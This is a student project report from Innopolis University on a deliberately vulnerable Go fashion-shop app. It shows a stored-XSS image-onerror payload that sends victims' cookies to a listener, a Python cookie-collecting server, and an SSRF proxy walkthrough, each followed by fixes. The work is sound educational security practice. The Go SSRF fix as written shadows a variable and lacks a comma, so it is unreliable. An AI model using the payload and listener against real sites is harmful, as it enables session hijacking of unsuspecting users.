## OWASP-Fashion-Shop Project
Innopolis University - 2025 year

---

 [Daniil Mayorov - d.mayorov@innopolis.university](mailto:Daniil%20Mayorov%20-%20d.mayorov@innopolis.university) – CBS-01
[2 Участник]
[3 Участник]
[4 Участник]

---

### **Goal/Tasks of the Project** 

#### Goal:
Develop an educational web application in Go language, simulating a mini-catalog of goods and containing three vulnerabilities from the OWASP Top 10 list (SQL injection, reflected XSS, SSRF). The goal of the project is to create working exploits (PoCs), analyze the causes of the vulnerabilities and develop recommendations on how to fix them in order to deepen the understanding of web application security.

#### Tasks:
1) Develop a vulnerable demo application:
	- Product catalog
	- Log in to my personal cabinet
	- Admin panel
2) Conduct vulnerability detection tests
3) Develop exploits for each of the 3 vulnerabilities
	- SQL Injection
	- SSRF
	- XSS
4) Analyze the code and identify where the threats are
5) Develop and document protection measures

#### Allocation of responsibilities in the team:

> Our team split into **two groups**:
> - The first writes a **small demo site** with vulnerabilities (2 member.)
> - The second group **investigates the application and looks for vulnerabilities** (2 member.)

Role 1 ():
- Earning **backend** part of the site
- Application **containerization** using **Docker**
- Database
Role 2 ():
- Development of the **frontend** part of the site
- Main catalog, login, registration, personal cabinet, admin pages 
Role 3 (Daniil Mayorov):
- **XSS** and **SSRF** vulnerabilities and **exploits**
- **Demo** of XSS, SSRF
- **Recommedation** of Fixing
Role 4 ():
- **SQL Injection** vulnerabilities and **exploits**
- **Demo** of SQL Injection
- **Recommedation** of Fixing

---
### **Execution plan/Methodology**

plan for the solution, any graphs, schemes, and description for the planned infrastructure

---
### **Development of solution/tests as the PoC** 

#### XSS

> What is it?
> This is a vulnerability in a website that allows an attacker to inject malicious JavaScript code into a page, which is then executed in the browser of an unsuspecting user as if it were legitimate code from the site.
###### **Example of attack:**
There is no **description field** validation in admin, which gives the attacker an attack vector.
So, if a user has admin access, he can **add a product with payload**. After that, the **product appears on the catalog page**. All those **who visit the catalog page** to view the products g**et the payload** and thus **send their data to the attacker** without even knowing it.

![[Pasted image 20251213165621.png]]

In this case, we are trying to load a picture on link x, but since the link does not exist, we get an error and the block in onerror is executed. and in onerror we send data to the attacker's site.
```
<img src=x onerror='new Image().src="http://localhost:11111/steal?cookie="+encodeURIComponent(document.cookie)'>
```
![[Pasted image 20251213170249.png]]
![[Pasted image 20251213171609.png]]

In the code we wait for the request, once it is received we output the data and send a transparent gif as a response.

Code for attack:
``` python
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f"\n🔥 Cookie:")
        query = urllib.parse.urlparse(self.path).query
        params = urllib.parse.parse_qs(query)
        if 'cookie' in params:
            cookies = params['cookie'][0]
            print(f"Cookies: {cookies}")
            print(f"From IP: {self.client_address[0]}")
            print(f"User-Agent: {self.headers.get('User-Agent')}")
        self.send_response(200)
        self.send_header('Content-Type', 'image/gif')
        self.end_headers()	self.wfile.write(b'GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;')

    def log_message(self, format, *args):
        pass  

print("Server works on port: 11111")
print("---- Wait Data...")
HTTPServer(('0.0.0.0', 11111), Handler).serve_forever()
```
##### **How to fix:**
**Problem in the function:**
``` go
func adminAddProductHandler(w http.ResponseWriter, r *http.Request) {
    c, err := r.Cookie("user_id")
    if err != nil {
        http.Error(w, "not logged in", 401)
        return
    }
    
    uid, _ := strconv.Atoi(c.Value)
    
    var isAdmin bool
    err = db.QueryRow("SELECT is_admin FROM users WHERE id=$1", uid).Scan(&isAdmin)
    
    if err != nil || !isAdmin {
        http.Error(w, "forbidden", 403)
        return
    }
    if r.Method != "POST" {
        http.Error(w, "POST required", 405)
        return
    }
    
    name := r.FormValue("name")              // <--- HERE PROBLEM
    desc := r.FormValue("description")       // <--- HERE PROBLEM
    price := r.FormValue("price_cents")      // <--- HERE PROBLEM
    img := r.FormValue("image_url")          // <--- HERE PROBLEM
    
    _, err = db.Exec(
        "INSERT INTO products (name, description, price_cents, image_url) VALUES ($1, $2, $3, $4)",
        name, desc, price, img,
    )                                         // <--- HERE PROBLEM
    if err != nil {
        http.Error(w, "db error: "+err.Error(), 500)
        return
    }
    w.Write([]byte("product added"))
}
```

In the current implementation of the function, the algorithm does not screen the input data, which means that the payload is already stored in the database. To fix this, we need to add a check for escaping

**Fixed:**
``` go
func adminAddProductHandler(w http.ResponseWriter, r *http.Request) {
	//...
    name := r.FormValue("name")
    desc := r.FormValue("description")
    price := r.FormValue("price_cents")
    img := r.FormValue("image_url")
    
    desc = html.EscapeString(desc)     // <--- FIX PROBLEM
    name = html.EscapeString(name)     // <--- FIX PROBLEM
    
    if img != "" {                     // <--- FIX PROBLEM
        parsed, err := url.Parse(img)
        if err != nil || (parsed.Scheme != "http" && parsed.Scheme != "https") {
            http.Error(w, "invalid image URL", 400)
            return
        }
    }
    //...
}
```

#### **SSRF**
> What is it?
> A web security vulnerability that allows an attacker to send requests on behalf of a server.

###### **Example of attack:**
You may notice that on the main page of the catalog, the server fetches data from itself, using `/image` as a proxy.

![[Pasted image 20251213183010.png]]

If you go to this url, a picture of clothes from the product catalog will open in our window
![[Pasted image 20251213183222.png]]

This vulnerability can be dangerous for accessing internal server resources, or an attacker can simply mask his real address with the server address, as is done below:
![[Pasted image 20251213183419.png]]

Write a small python server that will display the ip from which the request came:
``` python
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f"From IP: {self.client_address[0]}")
        self.send_response(200)
        self.end_headers()

    def log_message(self, format, *args):
        pass  

print("Server works on port: 11111")
print("---- Wait Data...")
HTTPServer(('0.0.0.0', 11111), Handler).serve_forever()
```

Run it and try to access the site from another device:
![[Pasted image 20251213185058.png]]

`127.0.0.1`:  **localhost**, accessed from the device on which the server is running.
`192.168.1.12`: ip address of another device
`192.168.1.195`: ip address of the current device on which the server is running (the request was played through a device with ip address `192.168.1.12`).

##### **How to fix:**
In the current implementation, the problem might be that we allow all urls, even those that might be dangerous:

``` go
func imageFetchHandler(w http.ResponseWriter, r *http.Request) {
    url := r.URL.Query().Get("url")
    if url == "" {
        http.Error(w, "missing url", 400)
        return
    }

    scheme := "http"
    if r.TLS != nil {
        scheme = "https"
    }
    
    proxyURL := scheme + "://" + r.Host + "/proxy?url=" + url
    resp, err := http.Get(proxyURL)
    
    if err != nil {
        http.Error(w, "proxy err: "+err.Error(), 500)
        return
    }
    
    defer resp.Body.Close()
    w.Header().Set("Content-Type", resp.Header.Get("Content-Type"))
    io.Copy(w, resp.Body)
}
```

To fix this, we can create a list of addresses that can be traversed, otherwise an error will be returned

``` go
func imageFetchHandler(w http.ResponseWriter, r *http.Request) {
    url := r.URL.Query().Get("url")
    if url == "" {
        http.Error(w, "missing url", 400)
        return
    }

	allowedPrefixes := []string{
        "http://localhost:8080/local-image"     // <----- HERE FIX
    }
    
    scheme := "http"
    if r.TLS != nil {
        scheme = "https"
        allowedPrefixes := []string{
	        "https://localhost:8080/local-image" // <----- HERE FIX
	    }
    }
	allowed := false                             // <----- HERE FIX
    for _, prefix := range allowedPrefixes {     // <----- HERE FIX
        if strings.HasPrefix(url, prefix) {      // <----- HERE FIX
            allowed = true                       // <----- HERE FIX
            break                                // <----- HERE FIX
        }                                        // <----- HERE FIX
    }                                            // <----- HERE FIX
    
    if !allowed {                                // <----- HERE FIX
        http.Error(w, "access denied: only local images are allowed", 403)
        return                                   // <----- HERE FIX
    }                                            // <----- HERE FIX
    
    proxyURL := scheme + "://" + r.Host + "/proxy?url=" + url
    resp, err := http.Get(proxyURL)
    
    if err != nil {
        http.Error(w, "proxy err: "+err.Error(), 500)
        return
    }
    
    defer resp.Body.Close()
    w.Header().Set("Content-Type", resp.Header.Get("Content-Type"))
    io.Copy(w, resp.Body)
}
```

---
### **Difficulties / New Skills**

###### **Difficulties:**
- **Teamwork and task coordination** – The division into two groups (application development and vulnerability detection) required clear communication and synchronization.
- **Setting up the environment and Docker** – There were difficulties with containerizing the application, especially with port forwarding and configuring the network to demonstrate XSS.
- **Writing exploits for XSS and SSRF** – it was difficult to come up with a really interesting attack, and not just show vulnerability.
- **Integrating vulnerabilities into a working application** – It's hard to make a full-fledged application in such a short time, so we tried to make a massively realistic test site, and not just show off the vulnerability.
###### **New skills:**
- Better understanding of the **Go** language
- **Writing exploits** with different types of attacks
- Better understanding of working with **BurpSuite**
- Better understanding of how vulnerabilities appear in real projects

---
### **Conclusion, contemplations, and judgment**

The project was successfully completed: a vulnerable Go web application with three critical vulnerabilities (SQL Injection, XSS, SSRF) was created, working exploits were developed, code analysis was performed and protection measures were proposed. All the goals have been achieved, and the demonstrations are working steadily.
